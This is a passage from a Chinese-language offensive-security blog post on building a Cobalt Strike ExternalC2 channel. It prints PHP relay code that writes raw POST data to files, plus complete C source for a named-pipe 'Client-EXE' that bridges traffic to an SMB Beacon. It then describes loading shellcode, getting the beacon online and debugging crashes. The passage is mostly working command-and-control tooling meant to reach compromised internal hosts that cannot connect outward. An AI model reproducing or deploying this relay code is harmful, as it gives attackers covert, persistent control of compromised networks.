        $fp=fopen($name,"wb");
        $data=file_get_contents("php://input");
        //一次性写
        fwrite($fp,$data);
        fclose($fp);
    }
    if(isset($_GET['action'])){
        //根据请求参数进行不同的操作
        if ($_GET['action']=='read'){
            readpipe("readrcoil");
        }elseif ($_GET['action']=='write'){
            writepipe("writercoil");
        }
    }else{
        //脚本执行成功
        echo "OK";
    }
4.3、Client-EXE
这个客户端也相当与一个中转
    // 代码来源：https://github.com/hl0rey/Web_ExternalC2_Demo/blob/master/client/c/webc2_loader/PipeOperationRelay/%E6%BA%90.c
    #include 
    #include 
    #define PAYLOAD_MAX_SIZE 512 * 1024
    #define BUFFER_MAX_SIZE 1024 * 1024
    //桥，字面意思。方便把自定义的管道和beacon管道桥接的结构体
    struct BRIDGE
    {
        HANDLE client;
        HANDLE server;
    };
    //从beacon读取数据
    DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
        DWORD size = 0, temp = 0, total = 0;
        /* read the 4-byte length */
        ReadFile(my_handle, (char*)& size, 4, &temp, NULL);
        printf("read_frame length: %d\n", size);
        /* read the whole thing in */
        while (total client;
        HANDLE beacon = bridge->server;
        DWORD length = 0;
        char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);
        if (buffer == NULL)
        {
            exit(-1);
        }
        //再次校验管道
        if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))
        {
            return FALSE;
        }
        while (TRUE)
        {
            if (ConnectNamedPipe(hpipe, NULL))
            {
                printf("client want read.\n");
                length = read_frame(beacon, buffer, BUFFER_MAX_SIZE);
                printf("read from beacon: %d\n", length);
                //分两次传送，发一次长度，再发数据。
                write_client(hpipe,(char *) &length, 4);
                FlushFileBuffers(hpipe);
                write_client(hpipe, buffer, length);
                FlushFileBuffers(hpipe);
                DisconnectNamedPipe(hpipe);
                //清空缓存区
                ZeroMemory(buffer, BUFFER_MAX_SIZE);
                length = 0;
            }
        }
        return 1;
    }
    //客户端写管道、服务端读管道逻辑
    DWORD WINAPI WriteOnlyPipeProcess(LPVOID lpvParam) {
        //取出两条管道
        struct BRIDGE* bridge = (struct BRIDGE*)lpvParam;
        HANDLE hpipe = bridge->client;
        HANDLE beacon = bridge->server;
        DWORD length = 0;
        char* buffer = VirtualAlloc(0, BUFFER_MAX_SIZE, MEM_COMMIT, PAGE_READWRITE);
        if (buffer == NULL)
        {
            exit(-1);
        }
        if ((hpipe == INVALID_HANDLE_VALUE) || (beacon == INVALID_HANDLE_VALUE))
        {
            return FALSE;
        }
        while (TRUE)
        {
            if (ConnectNamedPipe(hpipe, NULL))
            {
                //一次性读，一次性写
                printf("client want write.\n");
                length = read_client(hpipe, buffer);
                printf("read from client: %d\n", length);
                write_frame(beacon, buffer, length);
                DisconnectNamedPipe(hpipe);
                //清空缓存区
                ZeroMemory(buffer, BUFFER_MAX_SIZE);
                length = 0;
            }
        }
        return 2;
    }
    int main(int argc, char* argv[]) {
        //创建客户端读管道
        HANDLE hPipeRead = CreateNamedPipe("\\\\.\\pipe\\readrcoil", PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL);
        //创建客户端写管道
        HANDLE hPipeWrite = CreateNamedPipe("\\\\.\\pipe\\writercoil", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFFER_MAX_SIZE, BUFFER_MAX_SIZE, 0, NULL);
        //与beacon建立连接
        HANDLE hfileServer = CreateFileA("\\\\.\\pipe\\rcoil", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
        //检测管道和连接是否建立成功
        if ((hPipeRead == INVALID_HANDLE_VALUE) || (hPipeWrite == INVALID_HANDLE_VALUE) || (hfileServer == INVALID_HANDLE_VALUE))
        {
            if (hPipeRead == INVALID_HANDLE_VALUE)
            {
                printf("error during create readpipe.");
            }
            if (hPipeWrite == INVALID_HANDLE_VALUE)
            {
                printf("error during create writepipe.");
            }
            if (hfileServer == INVALID_HANDLE_VALUE)
            {
                printf("error during connect to beacon.");
            }
            exit(-1);
        }
        else
        {   
            //一切正常
            printf("all pipes are ok.\n");
        }
        //放入客户端读管道和beacon连接
        struct BRIDGE readbridge;
        readbridge.client = hPipeRead;
        readbridge.server = hfileServer;
        //启动客户端读管道逻辑
        HANDLE hTPipeRead = CreateThread(NULL, 0, ReadOnlyPipeProcess, (LPVOID)& readbridge, 0, NULL);
        //放入客户端写管道和beacon连接
        struct BRIDGE writebridge;
        writebridge.client = hPipeWrite;
        writebridge.server = hfileServer;
        //启动客户端写管道逻辑
        HANDLE hTPipeWrite = CreateThread(NULL, 0, WriteOnlyPipeProcess, (LPVOID)& writebridge, 0, NULL);
        //代码没有什么意义，直接写个死循环也行
        HANDLE waitHandles[] = { hPipeRead,hPipeWrite };
        while (TRUE)
        {
            WaitForMultipleObjects(2, waitHandles, TRUE, INFINITE);
        }
        return 0;
    }
当然，自用的会使用 `C#` 进行重写。能使用公开代码演示就尽量使用，当然，都标注了来源。
## 0x05 实操
### 5.1、加载脚本
加载 `ExternalC2.cna`，完成第一步。
### 5.2、Controller
这里我们使用的代码是参照 `XPN` 的代码写成与上方 `hl0rey` 一样格式的代码。
### 5.3、Client
使用加载器加载这一段 `shellcode`，查看 `pipelist`，可以看到我们自定义的管道名。
到这里，可以说明 `SMB Beacon` 已经成功运行，目前缺少的是可与之进行交互的上层进程。往下继续，运行 `Client-EXE`（使用hl0rey的代码），再次查看 `pipelist`，结果如下
### 5.4、Cobalt Strike
成功上线。
### 5.5、问题
但是，查看 `PipeOption.exe`，崩了。同时，`Cobalt Strike` 上线的机器，心跳包正常，但是功能无法使用。
应该是 `PipeOption.exe` 和 `php` 脚本之间出现的问题，通过抓包，发现这里应该是权限问题。
将 `PipeOpiton.exe` 以管理员权限运行，`action=read` 则没出错。
向 [Lz1y](https://www.lz1y.cn/) 大佬请教了下，最后还是改改 `Client-EXE` 和 `Client-Web`
的代码算了，不使用命名管道，直接读写文件，这样 `Client-Web` 的不同版本也可以很好写，不需要费劲利用管道。看到这里是不是很蛋疼，嘤嘤嘤。
## 0x06 参考
[Exploring Cobalt Strike's ExternalC2
framework](https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/)  
[利用 External C2
解决内网服务器无法出网的问题](https://mp.weixin.qq.com/s/q3QZ41qwFcKaIL7qb6q1fQ)  
[一起探索Cobalt Strike的ExternalC2框架](https://www.anquanke.com/post/id/103395)  
[externalc2spec.pdf](https://www.cobaltstrike.com/downloads/externalc2spec.pdf)